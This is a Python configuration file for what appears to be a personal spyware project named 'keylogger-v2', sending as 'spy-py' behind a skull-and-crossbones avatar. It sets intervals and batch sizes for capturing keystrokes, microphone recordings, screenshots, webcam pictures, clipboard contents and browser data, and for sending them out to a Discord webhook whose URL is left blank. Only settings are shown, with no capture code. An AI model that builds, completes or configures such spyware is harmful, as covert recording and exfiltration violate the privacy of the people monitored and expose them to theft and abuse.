import os
import tempfile

# Logging Configuration
LOG_DIRECTORY_PATH = "/Users/mohamedkhettab/Desktop/Coding/Python/keylogger-v2/"
if not LOG_DIRECTORY_PATH:
    LOG_DIRECTORY_PATH = os.path.join(tempfile.gettempdir(), "logs")
else:
    LOG_DIRECTORY_PATH = os.path.join(LOG_DIRECTORY_PATH, "logs")
LOG_ENTRIES_BEFORE_SEND = 10000

# Webhook Configuration
DISCORD_WEBHOOK_URL = ""
DISCORD_WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140"
DISCORD_WEBHOOK_USERNAME = "spy-py"

# Input Configuration
MAX_INPUT_EVENTS_BEFORE_SEND = 20

# Microphone Configuration
MICROPHONE_RECORD_DURATION_SEC = 60
MICROPHONE_RECORDINGS_BEFORE_SEND = 1

# Screen Configuration
SCREENSHOT_INTERVAL_SEC = 60
SCREENSHOTS_BEFORE_SEND = 1

# Webcam Configuration
WEBCAM_CAPTURE_INTERVAL_SEC = 60
WEBCAM_PICTURES_BEFORE_SEND = 1

# Clipboard Configuration
CLIPBOARD_LOG_INTERVAL_SEC = 500
CLIPBOARD_EVENTS_BEFORE_SEND = 20

# Browser Configuration
BROWSER_LOG_INTERVAL_SEC = 20000
BROWSER_LOGS_BEFORE_SEND = 1